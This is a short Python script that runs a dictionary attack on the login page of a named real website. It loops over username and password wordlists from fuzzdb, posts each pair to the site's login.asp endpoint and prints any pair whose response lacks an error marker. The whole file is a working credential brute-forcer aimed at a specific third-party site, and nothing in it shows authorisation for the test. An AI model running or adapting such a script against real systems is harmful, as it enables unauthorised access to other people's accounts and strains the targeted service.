import time

import requests

# weak username passwd temp to http://www.smartsunchina.com
for username in open('E://Sec//Tools//字典//fuzzdb//wordlists-user-passwd//names//namelist.txt'):
    for password in open('E://Sec//Tools//字典//fuzzdb//wordlists-user-passwd//passwds//weaksauce.txt'):
        payload = {
            'username': username,
            'password': password
        }
        url = 'http://www.smartsunchina.com/user/login.asp?act=login'
        resp = requests.post(url=url, data=payload)
        result = resp.content.decode('utf-8')
        if '#36134' not in result:
            print(username + '  ' + password)
            time.sleep(0.1)

